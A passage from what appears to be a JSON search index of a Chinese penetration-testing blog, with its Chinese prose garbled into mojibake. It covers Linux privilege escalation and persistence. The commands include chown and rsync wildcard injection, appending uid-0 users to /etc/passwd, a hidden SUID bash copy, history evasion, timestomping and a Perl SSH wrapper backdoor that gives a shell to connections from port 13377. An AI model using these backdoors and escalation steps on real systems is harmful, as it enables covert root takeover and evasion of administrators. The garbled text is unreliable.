¸çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚\n\\mï¼šè¿™è¡¨ç¤ºæœºå™¨çš„ç¡¬ä»¶æ¶æ„ã€‚ä¾‹å¦‚ï¼Œå®ƒå¯èƒ½ä¼šè¿”å› x86_64 è¡¨ç¤º 64 ä½ç³»ç»Ÿï¼Œæˆ– i686 è¡¨ç¤º 32 ä½ç³»ç»Ÿã€‚\ncat /etc/*-release\t# æŸ¥çœ‹Linux ç³»ç»Ÿçš„è¯¦ç»†ç‰ˆæœ¬ä¿¡æ¯ lsb_release -a\t# è·å–ç³»ç»Ÿçš„è¯¦ç»†ä¿¡æ¯ï¼Œä½†ç³»ç»Ÿä¸ä¸€å®šæœ‰lsb_release cat /proc/version\t# æŸ¥çœ‹ Linux å†…æ ¸çš„ç‰ˆæœ¬ä¿¡æ¯åŠç›¸å…³çš„ç¼–è¯‘ä¿¡æ¯ æŸ¥æ‰¾exp ä½¿ç”¨kaliè‡ªå¸¦çš„searchsploitå³å¯æŸ¥æ‰¾expï¼Œä¾‹å¦‚æŸ¥æ‰¾Ubantu 15.04çš„æ¼æ´ï¼š\nsearchsploit Ubantu 15.04 æŸ¥åˆ°åï¼Œæ¯”å¦‚expçš„pathä¸ºlinux/local/37088.cï¼š\næŸ¥çœ‹expï¼š\nsearchsploit -x linux/local/37088.c æœ‰å‡ ç‚¹éœ€è¦æ³¨æ„é˜…è¯»ï¼š\næºç æ³¨é‡Šï¼šäº†è§£æºç ç¼–è¯‘æ–¹å¼ æºç å†…å®¹ï¼šäº†è§£å·¥ä½œæµç¨‹ä¾¿äºä¼˜åŒ–ä¸ä¿®æ”¹ï¼Œä¸”é¿å…å­˜åœ¨æ¶æ„åé—¨ å¤åˆ¶expåˆ°å½“å‰ç›®å½•ï¼š\nsearchsploit -m linux/local/37088.c ä½¿ç”¨exp é€šå¸¸ä½¿ç”¨wgetç­‰åŠæ³•å°†expä¼ åˆ°å—å®³ä¸»æœºä¸Šï¼Œå¹¶æŒ‰ç…§expä½¿ç”¨æ–¹æ³•è¿›è¡Œææƒï¼ˆå€ŸåŠ©æœç´ å¼•æ“æŸ¥é˜…ä½¿ç”¨æ–¹æ³•ï¼‰ï¼Œé€šå¸¸æ¥è¯´ï¼š\n"
    }
,
    {
        "title": "Linuxææƒ-é€šé…ç¬¦ææƒ",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83-%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83/",
        "content": "Linuxææƒ-é€šé…ç¬¦ææƒ é€šé…ç¬¦å¯ä»¥å¸®åŠ©ç”¨æˆ·æå‡å·¥ä½œæ•ˆç‡ï¼Œæœ¬èº«æ²¡æœ‰å®‰å…¨é—®é¢˜ï¼Œä½†å½“å…¶ä¸æ½œåœ¨å±é™©çš„å‘½ä»¤ç»“åˆæ—¶ï¼Œå°±å¯èƒ½å¯¼è‡´ç³»ç»Ÿå®‰å…¨é—®é¢˜\nchown+é€šé…ç¬¦åŠ«æŒææƒ chownæ˜¯linuxä¸­ç”¨äºæ›´æ”¹æ–‡ä»¶æˆ–ç›®å½•æ‰€æœ‰æƒçš„å‘½ä»¤\nå½“ç®¡ç†å‘˜é€šè¿‡chownåŠ é€šé…ç¬¦çš„æ–¹å¼æ‰§è¡Œå‘½ä»¤ï¼Œæ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥ä½¿ç”¨chownçš„--referenceå‚æ•°è¾¾åˆ°æ–‡ä»¶æ‰€æœ‰è€…åŠ«æŒçš„æ•ˆæœ\n--ferenceå‚æ•°çš„ç”¨æ³•å¦‚ä¸‹ï¼š\n--reference=\u0026lt;å‚è€ƒç›®å½•æˆ–æ–‡ä»¶\u0026gt; # æ›´æ”¹ç›®æ ‡æ–‡ä»¶çš„æ‰€æœ‰è€…ä¸ºå‚è€ƒæ–‡ä»¶çš„æ‰€æœ‰è€… æ¥ä¸‹æ¥æ­å»ºä¸€ä¸ªåœºæ™¯\nç¯å¢ƒé…ç½® ä»¥rootæƒé™è¿›è¡Œé…ç½®\nåœ¨/tmp/passç›®å½•ä¸‹åˆ›å»ºroot.passä¸”æƒé™ä¸ºä»…rootå¯è¯»ï¼š\necho \u0026#34;Admin123456\u0026#34; \u0026gt; root.pass chmod 400 root.pass åˆ›å»ºä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼ŒåŸæœ¬ç›®çš„ä¸ºæ¯åˆ†é’Ÿå°†/tmp/passç›®å½•ä¸‹çš„.passæ–‡ä»¶æ‰€æœ‰è€…æ›´æ”¹ä¸ºrootï¼š\n* * * * * root cd /tmp/pass\u0026amp;\u0026amp;/bin/chown -R root:root *.pass (ç”±äºæ˜¯ä½¿ç”¨rootæƒé™è®¾ç½®çš„crontabï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ä¸æ³¨æ˜root)\nç¯å¢ƒé…ç½®å®Œæ¯•ï¼Œåˆ‡æ¢ç”¨æˆ·åˆ°yuy0ungï¼Œå¼€å§‹åˆ©ç”¨\næ¼æ´åˆ©ç”¨ ä¿¡æ¯æ”¶é›†å‘ç°å­˜åœ¨ä¸€ä¸ªä»¥rootæƒé™ä½¿ç”¨chownæ›´æ”¹æ–‡ä»¶æ‰€æœ‰è€…çš„å®šæ—¶ä»»åŠ¡ï¼Œä¸”ä¸è§„èŒƒçš„ä½¿ç”¨äº†é€šé…ç¬¦*\næ ¹æ®å†…å®¹å‘ç°/tmp/pass/ç›®å½•ä¸‹æœ‰ä¸ªroot.passçš„å¯†ç æ–‡ä»¶ï¼Œä½†æ²¡æœ‰æƒé™è¯»å–ï¼š\nè¿™é‡Œå¯ä»¥å°è¯•åˆ©ç”¨ä¸Šé¢å®šæ—¶ä»»åŠ¡ä¸­ä¸è§„èŒƒçš„å‘½ä»¤\næ–°å»ºä¸¤ä¸ªåä¸ºa.passã€\u0026ndash;reference=a.passçš„æ–‡ä»¶ï¼š\necho \u0026gt; a.pass\u0026amp;\u0026amp;echo \u0026gt;--reference=a.pass æ­¤æ—¶ï¼Œè‹¥å®šæ—¶ä»»åŠ¡ä»¥rootæƒé™æ‰§è¡Œcd /tmp/pass\u0026amp;\u0026amp;/bin/chown -R root:root *.passï¼Œç”±äº*çš„å­˜åœ¨ï¼Œæˆ‘ä»¬æ–°å»ºçš„æ–‡ä»¶ä¹Ÿä¼šè¢«å¸¦å…¥å‘½ä»¤ï¼Œè€Œ--reference=a.passæ–‡ä»¶ä¼šè¢«å½“ä½œæ˜¯chownå‘½ä»¤çš„å‚æ•°å¤„ç†ï¼Œé‚£ä¹ˆå®é™…ä¸Šçš„å‘½ä»¤å°±ä¼šå˜æˆï¼šå°†å½“å‰ç›®å½•æ‰€æœ‰.passæ–‡ä»¶æ‰€å±ç»„æ”¹ä¸ºa.passæ–‡ä»¶çš„æ‰€å±ç»„\nç­‰å¾…å®šæ—¶ä»»åŠ¡æ‰§è¡Œå‘ç°root.passçš„æ‰€æœ‰è€…å˜æˆäº†yuy0ungï¼š\næ¥ä¸‹æ¥å³å¯ç›´æ¥è¯»å–root.passæ–‡ä»¶ï¼š\ntar+é€šé…ç¬¦æ³¨å…¥ææƒ taræ˜¯linuxä¸­å¸¸ç”¨çš„æ–‡ä»¶å½’æ¡£å·¥å…·\nåœ¨å®é™…ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šé€šè¿‡å®šæ—¶ä»»åŠ¡ä½¿ç”¨tarå»å¤‡ä»½ç½‘ç«™æ–‡ä»¶ã€æ—¥å¿—æ–‡ä»¶\nå½“å®šæ—¶ä»»åŠ¡ä¸­è°ƒç”¨äº†tarä¸”ä½¿ç”¨äº†é€šé…ç¬¦ï¼Œå¯èƒ½å¯¼è‡´æƒé™æå‡\né€šé…ç¬¦æ³¨å…¥ä¸»è¦åœ¨äº--checkpoint-actionå’Œ--checkpointè¿™ä¸¤ä¸ªå‚æ•°çš„åˆ©ç”¨\nå‚æ•° åŠŸèƒ½ \u0026ndash;checkpoint-action=ACTION æ¯éš”[NUMBER]ä¸ªè®°å½•æ˜¾ç¤ºè¿›åº¦ä¿¡æ¯ï¼ˆé»˜è®¤ä¸º10ä¸ªï¼‰ \u0026ndash;checkpoint[=NUMBER] åœ¨æ¯ä¸ªæ£€æŸ¥ç‚¹ä¸Šæ‰§è¡ŒACTION åœºæ™¯å¤ç° è¿™ä¸ªåœºæ™¯åœ¨äº‘å°˜é¶åœºçš„linuxææƒç³»åˆ—-3ä¸­è€ƒå¯Ÿäº†ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºæˆ‘çš„wpä½œä¸ºå‚è€ƒï¼šäº‘å°˜é¶åœº-Linuxææƒç³»åˆ—WP\nrsync+é€šé…ç¬¦æ³¨å…¥ææƒ rsyncæ˜¯ä¸€ä¸ªç”¨äºåœ¨ä¸¤å°è®¡ç®—æœºä¹‹é—´åŒæ­¥æ–‡ä»¶çš„å‘½ä»¤è¡Œå·¥å…·\nåŒç†ï¼Œä¸åˆç†ä½¿ç”¨*ä¹Ÿå¯èƒ½å¯¼è‡´æƒé™æå‡\nç›´æ¥å¼€å§‹ç¯å¢ƒå¤ç°ï¼š\nç¯å¢ƒæ­å»º rootèº«ä»½åˆ›å»ºä¸€ä¸ª/tmp/bak\nå†™ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼š\nåˆ‡æ¢åˆ°yuy0ungï¼Œå¼€å§‹å¤ç°\næ¼æ´å¤ç° åˆ›å»ºåˆ©ç”¨æ–‡ä»¶ï¼š\necho \u0026#39;chmod 4777 /usr/bin/bash\u0026#39; \u0026gt; test.sh # ç»™bashèµ‹äºˆsuidæƒé™ï¼Œä¸ºææƒåšå‡†å¤‡ å†åˆ›å»ºä¸€ä¸ªç”¨äºæ³¨å…¥é€šé…ç¬¦çš„æ–‡ä»¶ï¼š\necho \u0026gt; \u0026#39;-e sh test.sh\u0026#39; # -e ä¸ºæŒ‡å®šè¦è¿è¡Œçš„shell ç­‰å¾…å®šæ—¶ä»»åŠ¡è§¦å‘test.shæ–‡ä»¶å†…å®¹ï¼Œç»™bashèµ‹äºˆsuidæƒé™ï¼š\nOKäº†ï¼Œç›´æ¥ææƒå³å¯ï¼š\nbash -p æ‹¿ä¸‹rootæƒé™\n",
        "summary": "Linuxææƒ-é€šé…ç¬¦ææƒ é€šé…ç¬¦å¯ä»¥å¸®åŠ©ç”¨æˆ·æå‡å·¥ä½œæ•ˆç‡ï¼Œæœ¬èº«æ²¡æœ‰å®‰å…¨é—®é¢˜ï¼Œä½†å½“å…¶ä¸æ½œåœ¨å±é™©çš„å‘½ä»¤ç»“åˆæ—¶ï¼Œå°±å¯èƒ½å¯¼è‡´ç³»ç»Ÿå®‰å…¨é—®é¢˜\nchown+é€šé…ç¬¦åŠ«æŒææƒ chownæ˜¯linuxä¸­ç”¨äºæ›´æ”¹æ–‡ä»¶æˆ–ç›®å½•æ‰€æœ‰æƒçš„å‘½ä»¤\nå½“ç®¡ç†å‘˜é€šè¿‡chownåŠ é€šé…ç¬¦çš„æ–¹å¼æ‰§è¡Œå‘½ä»¤ï¼Œæ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥ä½¿ç”¨chownçš„--referenceå‚æ•°è¾¾åˆ°æ–‡ä»¶æ‰€æœ‰è€…åŠ«æŒçš„æ•ˆæœ\n--ferenceå‚æ•°çš„ç”¨æ³•å¦‚ä¸‹ï¼š\n--reference=\u0026lt;å‚è€ƒç›®å½•æˆ–æ–‡ä»¶\u0026gt; # æ›´æ”¹ç›®æ ‡æ–‡ä»¶çš„æ‰€æœ‰è€…ä¸ºå‚è€ƒæ–‡ä»¶çš„æ‰€æœ‰è€… æ¥ä¸‹æ¥æ­å»ºä¸€ä¸ªåœºæ™¯\nç¯å¢ƒé…ç½® ä»¥rootæƒé™è¿›è¡Œé…ç½®\nåœ¨/tmp/passç›®å½•ä¸‹åˆ›å»ºroot.passä¸”æƒé™ä¸ºä»…rootå¯è¯»ï¼š\necho \u0026#34;Admin123456\u0026#34; \u0026gt; root.pass chmod 400 root.pass åˆ›å»ºä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼ŒåŸæœ¬ç›®çš„ä¸ºæ¯åˆ†é’Ÿå°†/tmp/passç›®å½•ä¸‹çš„.passæ–‡ä»¶æ‰€æœ‰è€…æ›´æ”¹ä¸ºrootï¼š\n* * * * * root cd /tmp/pass\u0026amp;\u0026amp;/bin/chown -R root:root *.pass (ç”±äºæ˜¯ä½¿ç”¨rootæƒé™è®¾ç½®çš„crontabï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ä¸æ³¨æ˜root)\nç¯å¢ƒé…ç½®å®Œæ¯•ï¼Œåˆ‡æ¢ç”¨æˆ·åˆ°yuy0ungï¼Œå¼€å§‹åˆ©ç”¨\næ¼æ´åˆ©ç”¨ ä¿¡æ¯æ”¶é›†å‘ç°å­˜åœ¨ä¸€ä¸ªä»¥rootæƒé™ä½¿ç”¨chownæ›´æ”¹æ–‡ä»¶æ‰€æœ‰è€…çš„å®šæ—¶ä»»åŠ¡ï¼Œä¸”ä¸è§„èŒƒçš„ä½¿ç”¨äº†é€šé…ç¬¦*\næ ¹æ®å†…å®¹å‘ç°/tmp/pass/ç›®å½•ä¸‹æœ‰ä¸ªroot.passçš„å¯†ç æ–‡ä»¶ï¼Œä½†æ²¡æœ‰æƒé™è¯»å–ï¼š\nè¿™é‡Œå¯ä»¥å°è¯•åˆ©ç”¨ä¸Šé¢å®šæ—¶ä»»åŠ¡ä¸­ä¸è§„èŒƒçš„å‘½ä»¤\næ–°å»ºä¸¤ä¸ªåä¸ºa.passã€\u0026ndash;reference=a.passçš„æ–‡ä»¶ï¼š\necho \u0026gt; a.pass\u0026amp;\u0026amp;echo \u0026gt;--reference=a.pass æ­¤æ—¶ï¼Œè‹¥å®šæ—¶ä»»åŠ¡ä»¥rootæƒé™æ‰§è¡Œcd /tmp/pass\u0026amp;\u0026amp;/bin/chown -R root:root *.passï¼Œç”±äº*çš„å­˜åœ¨ï¼Œæˆ‘ä»¬æ–°å»ºçš„æ–‡ä»¶ä¹Ÿä¼šè¢«å¸¦å…¥å‘½ä»¤ï¼Œè€Œ--reference=a.passæ–‡ä»¶ä¼šè¢«å½“ä½œæ˜¯chownå‘½ä»¤çš„å‚æ•°å¤„ç†ï¼Œé‚£ä¹ˆå®é™…ä¸Šçš„å‘½ä»¤å°±ä¼šå˜æˆï¼šå°†å½“å‰ç›®å½•æ‰€æœ‰.passæ–‡ä»¶æ‰€å±ç»„æ”¹ä¸ºa.passæ–‡ä»¶çš„æ‰€å±ç»„\nç­‰å¾…å®šæ—¶ä»»åŠ¡æ‰§è¡Œå‘ç°root.passçš„æ‰€æœ‰è€…å˜æˆäº†yuy0ungï¼š\næ¥ä¸‹æ¥å³å¯ç›´æ¥è¯»å–root.passæ–‡ä»¶ï¼š\ntar+é€šé…ç¬¦æ³¨å…¥ææƒ taræ˜¯linuxä¸­å¸¸ç”¨çš„æ–‡ä»¶å½’æ¡£å·¥å…·\nåœ¨å®é™…ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šé€šè¿‡å®šæ—¶ä»»åŠ¡ä½¿ç”¨tarå»å¤‡ä»½ç½‘ç«™æ–‡ä»¶ã€æ—¥å¿—æ–‡ä»¶\nå½“å®šæ—¶ä»»åŠ¡ä¸­è°ƒç”¨äº†tarä¸”ä½¿ç”¨äº†é€šé…ç¬¦ï¼Œå¯èƒ½å¯¼è‡´æƒé™æå‡\né€šé…ç¬¦æ³¨å…¥ä¸»è¦åœ¨äº--checkpoint-actionå’Œ--checkpointè¿™ä¸¤ä¸ªå‚æ•°çš„åˆ©ç”¨\nå‚æ•° åŠŸèƒ½ \u0026ndash;checkpoint-action=ACTION æ¯éš”[NUMBER]ä¸ªè®°å½•æ˜¾ç¤ºè¿›åº¦ä¿¡æ¯ï¼ˆé»˜è®¤ä¸º10ä¸ªï¼‰ \u0026ndash;checkpoint[=NUMBER] åœ¨æ¯ä¸ªæ£€æŸ¥ç‚¹ä¸Šæ‰§è¡ŒACTION åœºæ™¯å¤ç° è¿™ä¸ªåœºæ™¯åœ¨äº‘å°˜é¶åœºçš„linuxææƒç³»åˆ—-3ä¸­è€ƒå¯Ÿäº†ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºæˆ‘çš„wpä½œä¸ºå‚è€ƒï¼šäº‘å°˜é¶åœº-Linuxææƒç³»åˆ—WP\nrsync+é€šé…ç¬¦æ³¨å…¥ææƒ rsyncæ˜¯ä¸€ä¸ªç”¨äºåœ¨ä¸¤å°è®¡ç®—æœºä¹‹é—´åŒæ­¥æ–‡ä»¶çš„å‘½ä»¤è¡Œå·¥å…·\n"
    }
,
    {
        "title": "linuxæƒé™ç»´æŒ",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
        "content": "linuxæƒé™ç»´æŒ ä¿®æ”¹æ–‡ä»¶ã€ç»ˆç«¯å±æ€§ æ–‡ä»¶åˆ›å»ºæ—¶é—´ æœ‰æ—¶æˆ‘ä»¬ä¼šæ ¹æ®æ–‡ä»¶ä¿®æ”¹æ—¶é—´æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºåé—¨ï¼Œæ¯”å¦‚å¯¹æ¯”shell.phpå’Œindex.phpçš„ä¿®æ”¹æ—¶é—´æ˜¯å¦ç›¸å·®è¿‡å¤§\ntouchå‘½ä»¤ç”¨äºä¿®æ”¹æ–‡ä»¶æˆ–è€…ç›®å½•çš„æ—¶é—´å±æ€§ï¼Œå¯ä»¥ä½¿ç”¨touchä¿®æ”¹æ–‡ä»¶åˆ›å»ºæ—¶é—´ï¼š\ntouch -r index.php shell.php # å°†shell.phpçš„ä¿®æ”¹æ—¶é—´æ”¹ä¸ºå’Œindex.phpä¸€è‡´ æ–‡ä»¶é”å®š åœ¨Linuxä¸­ï¼Œä½¿ç”¨chattrå‘½ä»¤æ¥é˜²æ­¢rootå’Œå…¶ä»–ç®¡ç†ç”¨æˆ·è¯¯åˆ é™¤å’Œä¿®æ”¹é‡è¦æ–‡ä»¶åŠç›®å½•ï¼Œè€Œæ­¤æƒé™ç”¨ls -læ˜¯æŸ¥çœ‹ä¸å‡ºæ¥çš„ï¼Œä»è€Œè¾¾åˆ°éšè—æƒé™çš„ç›®çš„ï¼š\nchattr +i evil.php #é”å®šæ–‡ä»¶ rm -rf evil.php #ç›´æ¥åˆ é™¤ä¼šæç¤ºç¦æ­¢åˆ é™¤ lsattr evil.php #å±æ€§æŸ¥çœ‹ chattr -i evil.php #è§£é™¤é”å®š rm -rf evil.php #æ­¤æ—¶æ‰å¯ä»¥æ­£å¸¸åˆ é™¤æ–‡ä»¶ å†å²æ“ä½œå‘½ä»¤ æˆ‘ä»¬å¯èƒ½æƒ³ä¸è®©åœ¨shellä¸­æ‰§è¡Œçš„å‘½ä»¤è¢«è®°å½•åœ¨å‘½ä»¤è¡Œå†å²ä¸­ï¼Œä½†å•çº¯çš„history -c åªèƒ½æ¸…é™¤å…¨éƒ¨å‘½ä»¤è®°å½•ï¼Œå¯ä»¥å°è¯•ä¸‹é¢çš„æ–¹æ³•\né’ˆå¯¹ä½ çš„å·¥ä½œå…³é—­å†å²è®°å½• å¯ä»¥ä¸´æ—¶ç¦ç”¨å†å²åŠŸèƒ½ï¼Œè¿™æ„å‘³ç€åœ¨è¿™å‘½ä»¤ä¹‹åæ‰§è¡Œçš„æ‰€æœ‰æ“ä½œéƒ½ä¸ä¼šè®°å½•åˆ°å†å²ä¸­ï¼Œç„¶è€Œè¿™ä¸ªå‘½ä»¤ä¹‹å‰çš„æ‰€æœ‰ä¸œè¥¿éƒ½ä¼šåŸæ ·è®°å½•åœ¨å†å²åˆ—è¡¨ä¸­ï¼š\n[space]set +o history #[space] è¡¨ç¤ºç©ºæ ¼ã€‚å¹¶ä¸”ç”±äºç©ºæ ¼çš„ç¼˜æ•…ï¼Œè¯¥å‘½ä»¤æœ¬èº«ä¹Ÿä¸ä¼šè¢«è®°å½• æ‰§è¡Œäº†ç›®æ ‡å‘½ä»¤åè®°å¾—æ¢å¤ï¼š\n[Space]set -o history #å°†ç¯å¢ƒæ¢å¤åŸçŠ¶ å¯ä»¥çœ‹çœ‹ä¸‹é¢è¿™ä¸ªæƒ…å†µï¼š\nä¸Šå›¾åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ä½¿echo 2ndçš„å‘½ä»¤è®°å½•æ²¡æœ‰è¢«å­˜å‚¨åœ¨historyä¸­\nå†å²è®°å½•ä¸­åˆ é™¤æŒ‡å®šçš„å‘½ä»¤ å¦‚æœç›®æ ‡å‘½ä»¤å·²ç»å­˜åœ¨äºå†å²ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œåˆ é™¤ï¼š\næ‰¾åˆ°æƒ³è¦åˆ é™¤çš„å…³é”®å‘½ä»¤ï¼š\nhistory | grep \u0026#34;keyword\u0026#34; ä¸Šé¢æŸ¥è¯¢å¾—åˆ°äº†å¯¹åº”å‘½ä»¤è®°å½•çš„idï¼Œæ¥ä¸‹æ¥è¿›è¡Œåˆ é™¤ï¼š\nhistory -d [num] è™½ç„¶è¿™æ ·åˆ é™¤äº†å†å²è®°å½•ï¼Œä½†æˆ‘ä¸Šé¢æ‰§è¡Œçš„å‘½ä»¤ä¹Ÿè¢«è®°å½•äº†ï¼Œæ‰€ä»¥æˆ‘ä¸ªäººè®¤ä¸ºä¸Šé¢å…³é—­å†å²è®°å½•çš„æ–¹æ³•æ›´æœ‰æ•ˆ\næ·»åŠ ç”¨æˆ· é»˜è®¤å·²ç»æå‡è‡³rootæƒé™\npasswdå†™å…¥ rootæƒé™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡å†™å…¥passwdæ–‡ä»¶è¿›è¡Œç”¨æˆ·å†™å…¥\n/etc/passwd å„éƒ¨åˆ†å«ä¹‰ï¼š\nâ½¤æˆ·åï¼šå¯†ç ï¼šâ½¤æˆ·IDï¼šç»„IDï¼šèº«ä»½æè¿°ï¼šâ½¤æˆ·çš„å®¶â½¬å½•ï¼šâ½¤æˆ·ç™»å½•åæ‰€ä½¿â½¤çš„SHELL å¯ä»¥æ ¹æ®è¿™ä¸ªæ ¼å¼å¢åŠ è¶…çº§ç”¨æˆ·ï¼š\né¦–å…ˆæ„é€ ä¸€ä¸ªYuy0ungç”¨æˆ·çš„èº«ä»½ä¿¡æ¯ï¼š\nopenssl passwd -1 -salt Yuy0ung Yuy0ung //-1ä¸ºMD5åŠ å¯†ç®—æ³•ï¼Œ-saltæŒ‡å®šç›å€¼ï¼Œåé¢ä¸ºå¯†ç  æ„é€ å‡ºæ¥ï¼š\nYuy0ung:$1$Yuy0ung$9ETRQ.9iG7QgQQBI3xKu11:0:0:hack:/root:/bin/bash å†™å…¥/etc/passwd:\necho \u0026#39;Yuy0ung:$1$Yuy0ung$9ETRQ.9iG7QgQQBI3xKu11:0:0:hack:/root:/bin/bash\u0026#39; \u0026gt;\u0026gt; /etc/passwd æ·»åŠ åå³å¯ç›´æ¥ç™»å½•yuy0ungç”¨æˆ·\nå¦‚æœç³»ç»Ÿä¸å…è®¸uid=0çš„ç”¨æˆ·è¿œç¨‹ç™»å½• ç›´æ¥æ·»åŠ æ™®é€šç”¨æˆ·ï¼š\necho \u0026#39;Yuy0ung:$1$Yuy0ung$9ETRQ.9iG7QgQQBI3xKu11:-1:-1:-1:-1:-1:-1:500\u0026#39; \u0026gt;\u0026gt; /etc/shadow å¦‚æœå¯ä»¥å…è®¸uid=0è¿œç¨‹ç™»å½•ï¼š å¢åŠ è¶…çº§ç”¨æˆ·ï¼š\necho yuy0ung:x:0:0::/:/bin/sh\u0026#34; \u0026gt;\u0026gt; /etc/passwd #å¢åŠ è¶…çº§â½¤æˆ·è´¦å· passwd yuy0ung #ä¿®æ”¹yuy0ungçš„å¯†ç  ä¸äº¤äº’æ— å›æ˜¾æ·»åŠ Linuxå¯†ç  ç¬¬ä¸€ç§ï¼Œæ·»åŠ rootæƒé™ç”¨æˆ·:\nuseradd hacker -u 0 -o -g root -G root|| echo \u0026#34;123456\u0026#34; | passwd --stdin hacker #åˆ›å»ºè´¦æˆ·hackerã€å¯†ç 123456ä¸”ä¸ºrootæƒé™ ç¬¬äºŒç§ï¼Œåˆ›å»ºæ™®é€šç”¨æˆ·ï¼š\nuseradd test || echo \u0026#34;123456\u0026#34; | passwd --stdin test è¿™ç§æ–¹æ³•çš„ç”¨æˆ·æƒé™å¾ˆå°\nç¬¬ä¸‰ç§ï¼Œä¹Ÿæ˜¯åˆ›å»ºrootç”¨æˆ·ï¼Œåªæ˜¯è®¾ç½®å¯†ç çš„æ–¹å¼ä¸åŒï¼š\nuseradd -u 0 -o -g root -G root test2 || echo -e \u0026#34;1qazwsx2wsx\\n1qazwsx2wsx\u0026#34;|passwd test2 suidåé—¨ ï¼ˆéœ€è¦rootæƒé™ç•™åé—¨ï¼‰\nç”¨æ¥æƒé™æå‡çš„åé—¨ï¼Œå…¶å®å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªèƒ½ç”¨äºsuidææƒçš„åˆ©ç”¨ç‚¹ï¼Œè¿™é‡Œä»¥/bin/bashä¸ºä¾‹ï¼š\ncp /bin/bash /tmp/.mybash # å°†bashå¤åˆ¶ chmod 4755 /tmp/.mybash # èµ‹äºˆsuidæƒé™ åˆ©ç”¨ä¹Ÿå¾ˆç®€å•,å°±æ˜¯suidææƒçš„æ­¥éª¤ ï¼š\n/tmp/.mybash -p SSHåé—¨ SSH wrapper åˆ¤æ–­è¿æ¥æ¥æºç«¯å£ï¼Œå°†æ¶æ„ç«¯å£æ¥æºè®¿é—®ä¼ è¾“å†…å®¹é‡å®šå‘åˆ°/bin/shä¸­ï¼š\ncd /usr/sbin/ mv sshd ../bin/ echo \u0026#39;#!/usr/bin/perl\u0026#39; \u0026gt;sshd # åˆ›å»ºä¸€ä¸ªæ–°çš„sshdæ–‡ä»¶ echo \u0026#39;exec \u0026#34;/bin/sh\u0026#34; if(getpeername(STDIN) =~ /^..4A/);\u0026#39; \u0026gt;\u0026gt;sshd # 4Aæ˜¯13377çš„å°ç«¯æ¨¡å¼ï¼Œæ¨¡å¼åŒ¹é…ä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„shell echo \u0026#39;exec{\u0026#34;/usr/bin/sshd\u0026#34;} \u0026#34;/usr/sbin/sshd\u0026#34;,@ARGV,\u0026#39; \u0026gt;\u0026gt;sshd # æ‰§è¡Œæ—¶è°ƒç”¨çœŸæ­£çš„sshdç¨‹åº chmod u+x sshd /etc/init.d/ssh restart # æˆ– systemctl restart sshd # é‡å¯SSHå®ˆæŠ¤è¿›ç¨‹æœåŠ¡ è¿æ¥æ—¶åœ¨æœ¬æœºæ‰§è¡Œï¼š\nsocat STDIO TCP4:192.168.111.145:22,sourceport=13377 å³å¯è¿æ¥å¹¶è·å–shellï¼š\nè¿™é‡Œçš„åŸç†å¾ˆå·§å¦™ï¼š\ninit é¦–å…ˆå¯åŠ¨çš„æ˜¯ /usr/sbin/sshd ,è„šæœ¬æ‰§è¡Œåˆ° getpeername è¿™é‡Œçš„æ—¶å€™ï¼Œæ­£åˆ™åŒ¹é…ä¼šå¤±è´¥ï¼Œäºæ˜¯æ‰§è¡Œä¸‹ä¸€å¥ï¼Œå¯åŠ¨ /usr/bin/sshd ï¼Œè¿™æ˜¯åŸå§‹ sshd ã€‚åŸå§‹çš„ sshd ç›‘å¬ç«¯å£å»ºç«‹äº† tcp è¿æ¥åï¼Œä¼š fork ä¸€ä¸ªå­è¿›ç¨‹å¤„ç†å…·ä½“å·¥ä½œã€‚è¿™ä¸ªå­è¿›ç¨‹ï¼Œæ²¡æœ‰ä»€ä¹ˆæ£€éªŒï¼Œè€Œæ˜¯ç›´æ¥æ‰§è¡Œç³»ç»Ÿé»˜è®¤çš„ä½ç½®çš„ /usr/sbin/sshd ï¼Œè¿™æ ·å­æ§åˆ¶æƒåˆå›åˆ°è„šæœ¬äº†ã€‚æ­¤æ—¶å­è¿›ç¨‹æ ‡å‡†è¾“å…¥è¾“å‡ºå·²è¢«é‡å®šå‘åˆ°å¥—æ¥å­—ï¼Œ getpeername èƒ½çœŸçš„è·å–åˆ°å®¢æˆ·ç«¯çš„ TCP æºç«¯å£ï¼Œå¦‚æœæ˜¯ 13377 å°±æ‰§è¡Œshåˆ›å»ºä¸€ä¸ªshell\nä¼˜ç‚¹ï¼š\nåœ¨æœªè¿æ¥åé—¨çš„æƒ…å†µä¸‹ï¼Œç®¡ç†å‘˜æ˜¯çœ‹ä¸åˆ°ç«¯å£å’Œè¿›ç¨‹çš„ï¼Œlastä¹ŸæŸ¥ä¸åˆ°ç™»é™†ã€‚ åœ¨é’ˆå¯¹è¾¹ç•Œè®¾å¤‡å‡ºç½‘ï¼Œå†…ç½‘linuxæœåŠ¡å™¨æœªå‡ºç½‘çš„æƒ…å†µä¸‹ï¼Œç•™è¿™ä¸ªåé—¨å¯ä»¥éšæ—¶ç®¡ç†å†…ç½‘linuxæœåŠ¡å™¨ï¼Œè¿˜ä¸ä¼šç•™ä¸‹æ–‡ä»¶å’Œæ¶æ„ç½‘ç»œè¿æ¥è®°å½• SSH 